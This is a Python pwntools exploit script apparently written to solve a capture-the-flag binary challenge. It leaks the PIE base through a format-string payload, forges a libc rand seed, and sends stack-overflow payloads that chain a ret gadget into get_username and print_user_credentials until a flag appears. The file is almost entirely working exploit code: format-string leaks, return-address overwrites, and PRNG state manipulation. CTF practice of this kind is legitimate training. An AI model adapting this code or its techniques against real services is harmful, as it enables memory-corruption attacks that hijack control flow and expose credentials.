from pwn import *
import ctypes, sys

context.binary = elf = ELF('./chal')
context.log_level = 'info'

libc = ctypes.CDLL("libc.so.6")
ws = set(b'\x09\x0a\x0b\x0c\x0d\x20')

def has_ws(data):
    return any(b in ws for b in data)

def find_seed():
    for s in range(1, 20_000_000):
        sb = s.to_bytes(4, 'little')
        if any(b in ws for b in sb):
            continue
        libc.srand(s)
        vals = [libc.rand() for _ in range(5)]
        nums2 = vals[2:5]
        if all(b not in ws for v in nums2 for b in v.to_bytes(4, 'little')):
            return s, nums2
    raise Exception("no seed")

S, nums2 = find_seed()
log.info(f'S = {S}')
log.info(f'nums2 = {[hex(v) for v in nums2]}')

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

for attempt in range(30):
    try:
        p = start()

        # Stage 1: PIE leak
        p.sendline(b'A'*44 + b'%13$p')
        data = p.recvuntil(b'Please confirm your name once again : ', timeout=5)
        pie_base = int(data.split(b'\n')[0], 16) - 0x1437

        ret_gadget             = pie_base + 0x101a
        get_username           = pie_base + 0x12f1
        print_user_credentials = pie_base + 0x1234

        # Stage 2: get_name ret -> get_username
        payload2 = b'A'*56 + p64(ret_gadget) + p64(get_username)
        if has_ws(payload2[56:]):
            p.close(); continue
        p.sendline(payload2)

        # Stage 3: call 1 scanf #1 — overwrite seed
        p.recvuntil(b'Enter your username: ')
        p1  = b'A'*8 + p32(S) + b'AAAA' + b'B'*12 + b'CCCC' + b'D'*12
        if has_ws(p1):
            p.close(); continue
        p.sendline(p1)

        # Stage 4: call 1 scanf #2 — user_id overflow -> get_username
        p.recvuntil(b'Enter your User ID: ')
        p2 = b'A'*56 + p64(ret_gadget) + p64(get_username)
        if has_ws(p2[56:]):
            p.close(); continue
        p.sendline(p2)

        # Stage 5: call 2 scanf #1 — overwrite nums2
        p.recvuntil(b'Enter your username: ')
        p3  = b'A'*8 + b'AAAA' + b'AAAA' + b'B'*12 + b'CCCC'
        p3 += b''.join(p32(v) for v in nums2)
        if has_ws(p3):
            p.close(); continue
        p.sendline(p3)

        # Stage 6: call 2 scanf #2 — user_id overflow -> print_user_credentials
        p.recvuntil(b'Enter your User ID: ')
        p4 = b'A'*56 + p64(ret_gadget) + p64(print_user_credentials)
        if has_ws(p4[56:]):
            p.close(); continue
        p.sendline(p4)

        out = p.recvall(timeout=5)
        if b'exploiitm{' in out:
            print("\n*** FLAG ***")
            print(out.decode(errors='replace'))
            break
        else:
            log.warning(f'attempt {attempt}: no flag')
            log.warning(repr(out[:200]))
            p.close()

    except Exception as e:
        log.warning(f'attempt {attempt}: {e}')
        try: p.close()
        except: pass
